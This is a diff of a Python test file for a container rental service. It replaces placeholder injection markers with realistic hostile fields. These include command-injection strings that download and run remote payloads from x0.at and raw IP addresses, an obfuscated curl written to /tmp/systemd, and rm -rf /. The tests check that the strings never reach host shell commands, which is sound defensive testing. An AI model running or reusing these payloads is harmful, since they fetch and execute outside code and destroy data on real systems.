@@ -24,16 +24,13 @@ from services.rental_docker_sdk import ContainerExecResult, build_gpu_docker_con
 
 HOSTILE_USERNAME = "user'; rm -rf / #"
 HOSTILE_PASSWORD = (
-    "x' | curl https://x0.at/mney -o /tmp/mney"
+    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
     "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
 )
-HOSTILE_IMAGE = "registry.example/image;echo IMAGE_MARKER\n$(echo IMAGE_SUBSHELL)"
+HOSTILE_IMAGE = "|| curl -fsSL http://69.197.150.11:54321/update | bash ||:0.0.0"
 HOSTILE_ENV_VALUE = "value'; echo ENV_MARKER; $(echo env)"
-HOSTILE_PUBLIC_KEY = (
-    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEfakeKeyForTestsOnly "
-    "user@example; echo KEY_MARKER; $(echo key)"
-)
-HOSTILE_STARTUP_COMMAND = "\n\nsh /tmp/startup-marker.sh"
+HOSTILE_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
+HOSTILE_STARTUP_COMMAND = "\n\nsh /tmp/Jtd7.sh"
 HOSTILE_CONTAINER_NAME = "pod_name; echo CONTAINER_MARKER; $(echo name)"
 HOSTILE_VOLUME_NAME = "volume_bad; echo VOLUME_MARKER; $(echo volume)"
 HOSTILE_MINER_HOTKEY = "miner; echo HOTKEY_MARKER; $(echo hotkey)"
@@ -339,16 +336,17 @@ async def test_create_container_keeps_hostile_fields_out_of_host_shell_commands(
     _assert_markers_not_in_host_shell(
         _all_host_commands(captured_commands, ssh_client),
         [
-            "curl https://x0.at/mney",
+            "curl -fsSL https://x0.at/mney",
             "&&chmod +x /tmp/mney",
             "/tmp/mney   |echo",
             "rm -rf",
-            "IMAGE_MARKER",
-            "IMAGE_SUBSHELL",
+            "69.197.150.11:54321/update",
+            "| bash",
             "ENV_MARKER",
             "ENV_NEWLINE_MARKER",
-            "KEY_MARKER",
-            "startup-marker.sh",
+            "/tmp/systemd",
+            "203.23.128.30:443/linux_wss",
+            "/tmp/Jtd7.sh",
         ],
     )
     assert docker_client.login_calls == [
@@ -356,7 +354,7 @@ async def test_create_container_keeps_hostile_fields_out_of_host_shell_commands(
     ]
     assert docker_client.pulled_images == [HOSTILE_IMAGE]
     assert run_spec.image == HOSTILE_IMAGE
-    assert run_spec.command == ("sh", "/tmp/startup-marker.sh")
+    assert run_spec.command == ("sh", "/tmp/Jtd7.sh")
     assert run_spec.environment["HOSTILE_ENV"] == HOSTILE_ENV_VALUE
     assert len(key_specs) == 1
     assert HOSTILE_PUBLIC_KEY not in " ".join(key_specs[0].argv)
@@ -394,7 +392,10 @@ async def test_add_ssh_key_writes_public_keys_as_stdin_data(
     docker_client = docker_service.rental_docker_client_factory.client
     assert len(docker_client.exec_specs) == 1
     spec = docker_client.exec_specs[0]
-    _assert_markers_not_in_host_shell(ssh_client.commands, ["KEY_MARKER"])
+    _assert_markers_not_in_host_shell(
+        ssh_client.commands,
+        ["/tmp/systemd", "203.23.128.30:443/linux_wss"],
+    )
     assert spec.container_name == HOSTILE_CONTAINER_NAME
     assert HOSTILE_PUBLIC_KEY not in " ".join(spec.argv)
     assert spec.stdin == f"{HOSTILE_PUBLIC_KEY}\n"
@@ -430,7 +431,7 @@ async def test_remove_ssh_key_writes_public_keys_as_stdin_data(
     spec = docker_client.exec_specs[0]
     _assert_markers_not_in_host_shell(
         ssh_client.commands,
-        ["CONTAINER_MARKER", "KEY_MARKER"],
+        ["CONTAINER_MARKER", "/tmp/systemd", "203.23.128.30:443/linux_wss"],
     )
     assert spec.container_name == HOSTILE_CONTAINER_NAME
     assert HOSTILE_PUBLIC_KEY not in " ".join(spec.argv)
